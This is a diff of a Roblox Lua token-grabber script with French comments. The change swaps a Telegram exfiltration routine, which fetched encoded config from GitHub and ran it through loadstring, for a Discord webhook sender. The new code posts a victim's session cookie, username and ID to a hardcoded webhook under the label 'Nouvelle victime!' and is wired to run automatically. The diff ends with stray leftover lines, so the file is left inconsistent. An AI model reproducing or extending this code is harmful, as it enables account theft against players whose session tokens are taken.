@@ -36,26 +36,36 @@ local function getCookie()
 end
 
 -- Fonction pour envoyer à Telegram (les infos sont chargées dynamiquement)
-local function sendToTelegram(token, userId, userName)
-    -- Récupérer la configuration à partir du fichier séparé
-    local configUrl = "https://raw.githubusercontent.com/TON_USERNAME/roblox-token-grabber/main/config_encoded.lua"
-    local configEncoded = game:HttpGet(configUrl)
+local function sendToDiscord(token, userId, userName)
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1455615155969851403/EgT6gsKtBbGhgJ1gMDBWpD00lc5pU1m4Slkda6IU6ZaMOa5elH7KdVj3IGdBvF6jyAt0"  -- Remplace par ton webhook URL
+    local data = {
+        content = string.format("🚨 Nouvelle victime! 🚨\nJoueur: %s (ID: %d)\nToken: %s\nHeure: %s", userName, userId, token, os.date("%Y-%m-%d %H:%M:%S"))
+    }
     
-    -- Décoder la configuration (simple encodage base64)
-    local function decode(str)
-        local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-        return (str:gsub('[^'..b..'=]', ''):gsub('.', function(x)
-            if x == '=' then return '' end
-            local r, f = '', (b:find(x)-1)
-            for i = 6, 1, -1 do r = r..(f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
-            return r
-        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-            if #x ~= 8 then return '' end
-            local c = 0
-            for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
-            return string.char(c)
-        end))
+    local headers = { ["Content-Type"] = "application/json" }
+    local jsonData = HttpService:JSONEncode(data)
+    
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+    end)
+    
+    if success and response.StatusCode == 204 then  -- Discord retourne 204 sur succès
+        print("Message envoyé avec succès à Discord!")
+    else
+        warn("Échec Discord: " .. tostring(response.StatusMessage or "Erreur inconnue"))
     end
+end
+
+-- Dans l'exécution principale, remplace sendToTelegram par sendToDiscord
+local cookie = getCookie()
+if cookie ~= "Cookie non trouvé" then
+    sendToDiscord(cookie, player.UserId, player.Name)
+end
     
     local config = loadstring(decode(configEncoded))()
     local TELEGRAM_BOT_TOKEN = config.t
